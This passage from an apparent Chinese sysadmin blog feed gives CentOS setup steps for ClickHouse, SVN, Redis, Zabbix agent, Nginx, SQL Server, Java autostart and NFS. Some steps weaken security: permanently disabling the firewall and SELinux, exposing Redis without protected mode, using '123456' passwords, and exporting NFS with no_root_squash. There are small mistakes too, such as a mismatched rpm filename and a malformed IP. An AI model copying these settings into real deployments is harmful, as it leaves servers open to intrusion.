class="name">case</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">min_part_size</span>&gt;</span>10000000000<span class="tag">&lt;/<span class="name">min_part_size</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">min_part_size_ratio</span>&gt;</span>0.01<span class="tag">&lt;/<span class="name">min_part_size_ratio</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">method</span>&gt;</span>lz4<span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">case</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">clickhouse_compression</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">clickhouse_remote_servers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">yandex</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>重启clickhouse服务<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service clickhouse-server restart</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果不成功，则使用以下命令</span></span><br><span class="line">nohup /usr/bin/clickhouse-server --config=/etc/clickhouse-server/config.xml $</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="创建数据表（所有节点）"><a href="#创建数据表（所有节点）" class="headerlink" title="创建数据表（所有节点）"></a>创建数据表（所有节点）</h3><p>使用可视化工具连接每个节点，在上面创建MergeTree</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create table</span> test.data</span><br><span class="line">(</span><br><span class="line">  country String,</span><br><span class="line">  province String,</span><br><span class="line">  <span class="keyword">value</span> String</span><br><span class="line">)</span><br><span class="line">engine<span class="operator">=</span>MergeTree()</span><br><span class="line"><span class="keyword">partition</span> <span class="keyword">by</span> (country, province)</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">value</span>;</span><br></pre></td></tr></table></figure>
<h3 id="创建分布式表（node1节点）"><a href="#创建分布式表（node1节点）" class="headerlink" title="创建分布式表（node1节点）"></a>创建分布式表（node1节点）</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create table</span> test.mo <span class="keyword">as</span> test.data ENGINE <span class="operator">=</span> Distributed(test_cluster, test, data, rand());</span><br></pre></td></tr></table></figure>
<h3 id="测试连接"><a href="#测试连接" class="headerlink" title="测试连接"></a>测试连接</h3><p><strong>使用Python连接clickhouse</strong></p>
<ul>
<li>安装clickhouse-driver</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install clickhouse-driver</span><br></pre></td></tr></table></figure>
<ul>
<li>执行命令</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> clickhouse_driver <span class="keyword">import</span> Client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在哪个节点创建了分布式表，就连接哪个节点</span></span><br><span class="line">client = Client(<span class="string">&#x27;192.168.143.20&#x27;</span>, user=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>, database=<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(client.execute(<span class="string">&#x27;select count(*) from mo&#x27;</span>))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS安装软件三【SVN搭建】</title>
    <url>/cnblogs.github.io/p/8f75.html</url>
    <content><![CDATA[<p><strong>svn安装</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">yum -y install subversion</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看svn安装位置</span></span><br><span class="line">rpm -ql subversion</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看svn版本</span></span><br><span class="line">/usr/bin/svnversion --version</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建svn版本库目录</span></span><br><span class="line">mkdir -p /var/svn/app   #指定目录</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建版本库</span></span><br><span class="line">svnadmin create /var/svn/app</span><br></pre></td></tr></table></figure>

<p>进入&#x2F;var&#x2F;svn&#x2F;app&#x2F;conf目录（该svn版本库配置文件）</p>
<ul>
<li>authz文件是权限控制文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[aliases]</span><br><span class="line">[groups]</span><br><span class="line">admin = cc,dd,ss</span><br><span class="line">[/]</span><br><span class="line">@admin = rw</span><br></pre></td></tr></table></figure>
<ul>
<li>passwd是帐号密码文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[users]</span><br><span class="line">cc = 123456</span><br><span class="line">dd = 123456</span><br><span class="line">ss = 123456</span><br></pre></td></tr></table></figure>
<ul>
<li>svnserve.conf SVN服务配置文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[general]</span><br><span class="line">anon-access = none</span><br><span class="line">auth-access = write</span><br><span class="line">password-db = passwd</span><br><span class="line">authz-db = authz</span><br><span class="line">realm = /var/svn/app</span><br><span class="line">[sasl]</span><br></pre></td></tr></table></figure>

<p>启动svn版本库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">svnserve -d -r /var/svn/app</span><br></pre></td></tr></table></figure>

<p>关闭svn</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -ef | grep svn   查看进程</span><br><span class="line">Kill -9 14977    杀掉进程</span><br></pre></td></tr></table></figure>

<p>配置防火墙</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --add-port=3690/tcp                    ##添加3690服务端口号</span><br><span class="line">svnserve -d -r /var/svn/app --listen-port 3690                        ##将另一个版本库指定别的端口</span><br><span class="line">firewall-cmd --reload                                                                         ##重载配置</span><br><span class="line">firewall-cmd --list-all                                                                          ##查看哪些的服务及端口号已经打开了</span><br><span class="line">systemctl status firewalld.service                                                 ##查看防火墙运行状态</span><br><span class="line">systemctl stop firewalld.service                                                    ##关闭防火墙</span><br><span class="line">systemctl status firewalld.service                                                ##再次查看防火墙运行状态</span><br><span class="line">systemctl disable firewalld.service                                             ##永久禁止防火墙，下次重启服务器也不会开启</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS安装软件四【Redis搭建】</title>
    <url>/cnblogs.github.io/p/2553.html</url>
    <content><![CDATA[<h3 id="Redis5-0安装"><a href="#Redis5-0安装" class="headerlink" title="Redis5.0安装"></a>Redis5.0安装</h3><p><strong>方式一</strong></p>
<h4 id="使用包管理器"><a href="#使用包管理器" class="headerlink" title="使用包管理器"></a>使用包管理器</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 CentOS/RHEL</span></span><br><span class="line">sudo yum install epel-release -y</span><br><span class="line">sudo yum install redis -y</span><br></pre></td></tr></table></figure>

<p><strong>方式二</strong></p>
<h4 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装"></a>下载与安装</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载</span></span><br><span class="line">wget https://rpmfind.net/linux/remi/enterprise/9/modular/x86_64/redis-5.0.14-1.el9.remi.x86_64.rpm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">sudo yum localinstall redis-5.0.14-1.el7.remi.x86_64.rpm</span><br></pre></td></tr></table></figure>

<p><strong>方式三</strong></p>
<h4 id="源码编译安装"><a href="#源码编译安装" class="headerlink" title="源码编译安装"></a>源码编译安装</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装依赖 CentOS/RHEL</span></span><br><span class="line">sudo yum groupinstall &quot;Development Tools&quot; -y  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载最新稳定版（以 7.2.4 为例，替换为官网最新版本号）</span></span><br><span class="line">wget https://download.redis.io/releases/redis-7.2.4.tar.gz</span><br><span class="line">tar xzf redis-7.2.4.tar.gz</span><br><span class="line">cd redis-7.2.4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译并安装到 /usr/local/redis</span></span><br><span class="line">make</span><br><span class="line">sudo make install PREFIX=/usr/local/redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建配置文件目录</span></span><br><span class="line">sudo mkdir /etc/redis</span><br><span class="line">sudo cp redis.conf /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>

<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo  nano /etc/redis.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">daemonized no 改为 daemonized <span class="built_in">yes</span> 以后台静默进程启动</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把 <span class="built_in">bind</span> 127.0.0.1 注释掉</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">protected-mode <span class="built_in">yes</span> 把<span class="built_in">yes</span>改为no</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果想要设置密码: requirepass 密码（可选）</span></span><br></pre></td></tr></table></figure>
<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启redis服务</span></span><br><span class="line">sudo systemctl restart redis.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置redis服务为开机自启</span></span><br><span class="line">sudo systemctl enable redis.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> 查看redis是否启动成功</span></span><br><span class="line">ps aux | grep redis</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查 Redis 服务状态</span></span><br><span class="line">sudo systemctl status redis</span><br></pre></td></tr></table></figure>
<h4 id="防护墙打开端口6379"><a href="#防护墙打开端口6379" class="headerlink" title="防护墙打开端口6379"></a>防护墙打开端口6379</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加端口到 firewalld</span></span><br><span class="line">sudo firewall-cmd --zone=public --add-port=6379/tcp --permanent</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新加载防火墙配置</span></span><br><span class="line">sudo firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS安装软件二【Zabbix-Agent搭建】</title>
    <url>/cnblogs.github.io/p/ef07.html</url>
    <content><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="1、防火墙配置"><a href="#1、防火墙配置" class="headerlink" title="1、防火墙配置"></a>1、防火墙配置</h3><p>方法一、关闭linux操作系统自带的防火墙：</p>
<ul>
<li>临时关闭：systemctl stop firewalld</li>
<li>永久关闭：systemctl disable firewalld</li>
</ul>
<p>方法二、linux操作系统自带防火墙放通10050端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd  --zone=public  --add-port=10050/tcp  --permanent</span><br><span class="line">firewall-cmd  --reload</span><br></pre></td></tr></table></figure>
<h3 id="2、永久关闭selinux"><a href="#2、永久关闭selinux" class="headerlink" title="2、永久关闭selinux"></a>2、永久关闭selinux</h3><ul>
<li>临时关闭：setenforce 0</li>
<li>永久关闭：编辑&#x2F;etc&#x2F;selinux.config ,将enforcing取值改为disabled ，保存退出</li>
</ul>
<p><strong>yum方式安装</strong><br>1、配置zabbix仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -Uvh https://repo.zabbix.com/zabbix/6.0/rhel/7/x86_64/zabbix-release-6.0-3.el7.noarch.rpm</span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure>
<p>2、安装agent</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y zabbix-agent</span><br></pre></td></tr></table></figure>
<p>3、配置 Zabbix-Agent 指向 Zabbix-Server</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/zabbix/zabbix_agentd.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server=192.168.244.128   #指向serverIP</span><br><span class="line">ServerActive=192.168.244.128   #指向serverIP</span><br><span class="line">Hostname=k8s-master   #server上该服务器取名必须与该值相同</span><br><span class="line">ListenIP=0.0.0.0   #填写本地IP或者监听所有</span><br></pre></td></tr></table></figure>
<p>4、启动agent服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start zabbix-agent</span><br><span class="line">systemctl enable zabbix-agent</span><br><span class="line">systemctl status zabbix-agent</span><br></pre></td></tr></table></figure>

<h2 id="二进制包安装"><a href="#二进制包安装" class="headerlink" title="二进制包安装"></a>二进制包安装</h2><p>1、下载二进制包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://cdn.zabbix.com/zabbix/binaries/stable/6.0/6.0.3/zabbix_agent-6.0.3-linux-3.0-amd64-static.tar.gz</span><br></pre></td></tr></table></figure>
<p>2、创建用户和目录及更改属主（组）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd zabbix</span><br><span class="line">mkdir /usr/local/zabbix</span><br><span class="line">mkdir -p /data/zabbix/logs/   #日志路径</span><br><span class="line">mkdir -p /data/scripts/init.d/   #启动脚本路径</span><br><span class="line">chown -R zabbix:zabbix /usr/local/zabbix</span><br><span class="line">chown -R zabbix:zabbix /data/zabbix/</span><br></pre></td></tr></table></figure>
<p>3、解压二进制包到zabbix目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar xvf zabbix_agent-6.0.3-linux-3.0-amd64-static.tar.gz -C /usr/local/zabbix</span><br></pre></td></tr></table></figure>
<p>4、修改agent配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat &gt; /usr/local/zabbix/conf/zabbix_agentd.conf &lt;&lt; EOF</span><br><span class="line">PidFile=/data/zabbix/logs/zabbix_agentd.pid</span><br><span class="line">LogFile=/data/zabbix/logs/zabbix_agentd.log</span><br><span class="line">Server=192.168.244.1154</span><br><span class="line">ListenPort=10050</span><br><span class="line">ListenIP=0.0.0.0</span><br><span class="line">ServerActive=192.168.244.154</span><br><span class="line">Hostname=mysql</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<p>5、配置agent启动脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /data/scripts/init.d/agent_start.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">·················································</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">/bin/bash</span></span><br><span class="line">usage() &#123;</span><br><span class="line"> echo &quot;Usage: sh 脚本名.sh [start|stop|restart|status]&quot;</span><br><span class="line"> exit 1</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">检查程序是否在运行</span></span><br><span class="line">is_exist()&#123;</span><br><span class="line"> pid=`ps -ef |grep zabbix_agent|grep -v &quot;grep&quot; |awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">如果不存在返回1，存在返回0</span></span><br><span class="line"> if [ -z &quot;$&#123;pid&#125;&quot; ]; then</span><br><span class="line"> return 1</span><br><span class="line"> else</span><br><span class="line"> return 0</span><br><span class="line"> fi</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动方法</span></span><br><span class="line">start()&#123;</span><br><span class="line"> is_exist</span><br><span class="line"> if [ $? -eq &quot;0&quot; ]; then</span><br><span class="line"> echo &quot;agent2 is already running. pid=$&#123;pid&#125; .&quot;</span><br><span class="line"> else</span><br><span class="line"> /usr/local/zabbix/sbin/zabbix_agentd -c /usr/local/zabbix/conf/zabbix_agentd.conf &gt;/dev/null 2&gt;&amp;1 &amp; </span><br><span class="line"> echo &quot;agent2 start success&quot;</span><br><span class="line"> fi</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">停止方法</span></span><br><span class="line">stop()&#123;</span><br><span class="line"> is_exist</span><br><span class="line"> if [ $? -eq &quot;0&quot; ]; then</span><br><span class="line"> kill -9 $pid</span><br><span class="line"> else</span><br><span class="line"> echo &quot;agent2 is not running&quot;</span><br><span class="line"> fi</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启</span></span><br><span class="line">restart()&#123;</span><br><span class="line"> stop</span><br><span class="line"> start</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">根据输入参数，选择执行对应方法，不输入则执行使用说明</span></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line"> &quot;start&quot;)</span><br><span class="line"> start</span><br><span class="line"> ;;</span><br><span class="line"> &quot;stop&quot;)</span><br><span class="line"> stop</span><br><span class="line"> ;;</span><br><span class="line"> &quot;restart&quot;)</span><br><span class="line"> restart</span><br><span class="line"> ;;</span><br><span class="line"> *)</span><br><span class="line"> usage</span><br><span class="line"> ;;</span><br><span class="line">esac</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">·················································</span></span><br></pre></td></tr></table></figure>
<p>6、自启动agent</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;/data/scripts/init.d/agent_start.sh start &amp;&#x27; &gt;&gt; /etc/rc.local</span><br><span class="line">chmod +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>
<p>7、启动agent</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/local/zabbix/sbin/zabbix_agentd -c /usr/local/zabbix/conf/zabbix_agentd.conf &amp;</span><br><span class="line">ps -ef |grep agent</span><br></pre></td></tr></table></figure>
<p>8、在server上添加Agent主机<br>点击配置 -&gt;主机 -&gt;添加主机 -&gt;填写主机内容 -&gt;添加，主机就添加成功了。</p>
]]></content>
      <categories>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS总结一【常规配置】</title>
    <url>/cnblogs.github.io/p/12509.html</url>
    <content><![CDATA[<h3 id="更新YUM源"><a href="#更新YUM源" class="headerlink" title="更新YUM源"></a>更新YUM源</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -al /etc/yum.repos.d</span><br><span class="line">cp CentOS-Base.repo CentOS-Base.repo.backup</span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">yum clean all</span><br><span class="line">yum makecache</span><br><span class="line">yum -y update</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS总结三【YUM命令安装软件】</title>
    <url>/cnblogs.github.io/p/8358.html</url>
    <content><![CDATA[<h3 id="Nginx1-22-1安装"><a href="#Nginx1-22-1安装" class="headerlink" title="Nginx1.22.1安装"></a>Nginx1.22.1安装</h3><h4 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://nginx.org/packages/centos/7/x86_64/RPMS/nginx-1.22.1-1.el7.ngx.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum localinstall nginx-1.22.1-1.el7.ngx.x86_64.rpm</span><br></pre></td></tr></table></figure>
<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nginx -V</span><br><span class="line"></span><br><span class="line">/etc/nginx        #主目录</span><br><span class="line">/etc/nginx/nginx.conf   #配置文件</span><br><span class="line">/var/log/nginx    #日志</span><br><span class="line">/var/cache/nginx  #缓存</span><br><span class="line">/usr/sbin/nginx   #主程序</span><br><span class="line">/usr/lib64/nginx/modules  #组件模块</span><br></pre></td></tr></table></figure>
<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start nginx          # 启动服务</span><br><span class="line">sudo systemctl enable nginx         # 设置为开机自启</span><br><span class="line">sudo systemctl status nginx         # 检查 服务状态</span><br></pre></td></tr></table></figure>


<h3 id="SQL-Server安装"><a href="#SQL-Server安装" class="headerlink" title="SQL Server安装"></a>SQL Server安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 添加 Microsoft 的官方存储库：</span></span></span><br><span class="line">sudo curl -o /etc/yum.repos.d/mssql-server. repo https://packages.microsoft.com/config/rhel/7/mssql-server-2019.repo</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 安装 SQL Server：</span></span></span><br><span class="line">sudo yum install -y mssql-server</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 配置 SQL Server：</span></span></span><br><span class="line">sudo /opt/mssql/bin/mssql-conf setup</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 在配置过程中，你需要接受许可协议并设置 SA 用户的密码。</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 启动 SQL Server 服务：</span></span></span><br><span class="line">sudo systemctl start mssql-server</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 验证 SQL Server 服务是否正在运行：</span></span></span><br><span class="line">systemctl status mssql-server</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS总结二【设置Java开机自动运行】</title>
    <url>/cnblogs.github.io/p/23847.html</url>
    <content><![CDATA[<h3 id="方法一：使用systemd服务"><a href="#方法一：使用systemd服务" class="headerlink" title="方法一：使用systemd服务"></a>方法一：使用systemd服务</h3><p>systemd是Linux系统中广泛使用的初始化系统和系统管理守护进程，可以用来管理开机启动项</p>
<h4 id="创建一个服务文件"><a href="#创建一个服务文件" class="headerlink" title="创建一个服务文件"></a>创建一个服务文件</h4><p>创建一个新的service文件，例如ruoyi-admin.service，路径为&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/systemd/system/ruoyi-admin.service</span><br></pre></td></tr></table></figure>
<h4 id="编辑服务文件"><a href="#编辑服务文件" class="headerlink" title="编辑服务文件"></a>编辑服务文件</h4><p>在文件中添加以下内容，根据实际情况修改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=ruoyi-admin</span><br><span class="line">After=network.target</span><br><span class="line">[Service]</span><br><span class="line">User=root</span><br><span class="line">Group=root</span><br><span class="line">WorkingDirectory=/home/zhao/programs/ruoyi</span><br><span class="line">ExecStart=/usr/bin/java -jar /home/zhao/programs/ruoyi/ruoyi-admin.jar</span><br><span class="line">SuccessExitStatus=143</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartSec=10</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
<ul>
<li>Description：服务的描述。</li>
<li>After：指定该服务在</li>
<li>network.target之后启动。</li>
<li>User和Group：运行该服务的用户和组。</li>
<li>WorkingDirectory：工作目录。</li>
<li>ExecStart：启动Java程序的命令。</li>
<li>SuccessExitStatus：程序正常退出的状态码。</li>
<li>Restart：设置服务在失败后自动重启。</li>
<li>RestartSec：重启前的等待时间。</li>
</ul>
<h4 id="重新加载systemd配置并启动服务"><a href="#重新加载systemd配置并启动服务" class="headerlink" title="重新加载systemd配置并启动服务"></a>重新加载systemd配置并启动服务</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl start ruoyi-admin</span><br></pre></td></tr></table></figure>
<h4 id="设置开机自启"><a href="#设置开机自启" class="headerlink" title="设置开机自启"></a>设置开机自启</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable ruoyi-admin</span><br></pre></td></tr></table></figure>
<h4 id="检查服务状态"><a href="#检查服务状态" class="headerlink" title="检查服务状态"></a>检查服务状态</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl status ruoyi-admin</span><br></pre></td></tr></table></figure>

<h3 id="方法二：使用crontab"><a href="#方法二：使用crontab" class="headerlink" title="方法二：使用crontab"></a>方法二：使用crontab</h3><h4 id="编辑crontab文件"><a href="#编辑crontab文件" class="headerlink" title="编辑crontab文件"></a>编辑crontab文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
<h4 id="添加开机启动项"><a href="#添加开机启动项" class="headerlink" title="添加开机启动项"></a>添加开机启动项</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">@reboot /usr/bin/java -jar /home/zhao/programs/ruoyi/ruoyi-admin.jar</span><br></pre></td></tr></table></figure>
<ul>
<li>这里的@reboot表示在系统启动时执行该命令。</li>
<li>保存文件并退出编辑器，crontab会自动重新加载配置</li>
</ul>
<h3 id="方法三：使用rc-local"><a href="#方法三：使用rc-local" class="headerlink" title="方法三：使用rc.local"></a>方法三：使用rc.local</h3><h4 id="编辑rc-local文件"><a href="#编辑rc-local文件" class="headerlink" title="编辑rc.local文件"></a>编辑rc.local文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>
<h4 id="添加启动命令"><a href="#添加启动命令" class="headerlink" title="添加启动命令"></a>添加启动命令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/java -jar /home/zhao/programs/ruoyi/ruoyi-admin.jar</span><br></pre></td></tr></table></figure>
<h4 id="赋予rc-local执行权限"><a href="#赋予rc-local执行权限" class="headerlink" title="赋予rc.local执行权限"></a>赋予rc.local执行权限</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chmod +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>
<h4 id="启动rc-local服务"><a href="#启动rc-local服务" class="headerlink" title="启动rc.local服务"></a>启动rc.local服务</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start rc.local</span><br></pre></td></tr></table></figure>
<h4 id="设置开机自启-1"><a href="#设置开机自启-1" class="headerlink" title="设置开机自启"></a>设置开机自启</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable rc.local</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS总结五【NFS共享目录配置】</title>
    <url>/cnblogs.github.io/p/55378.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>角色</th>
<th>IP</th>
</tr>
</thead>
<tbody><tr>
<td>服务端</td>
<td>192.168.59.101</td>
</tr>
<tr>
<td>客户端</td>
<td>192.168.59.102</td>
</tr>
</tbody></table>
<h3 id="服务端配置-192-168-59-101"><a href="#服务端配置-192-168-59-101" class="headerlink" title="服务端配置(192.168.59.101)"></a>服务端配置(192.168.59.101)</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查nfs服务安装情况，一般都是系统安装好的</span></span><br><span class="line">systemctl status rpcbind</span><br><span class="line">systemctl status nfs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">若没有启动则启动</span></span><br><span class="line">systemctl start rpcbind</span><br><span class="line">systemctl start nfs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置共享目录，并设置内容</span></span><br><span class="line">vim /etc/exports</span><br><span class="line">/data/wwwroot 192.168.59.0/24(rw,sync,no_subtree_check,no_root_squash)</span><br><span 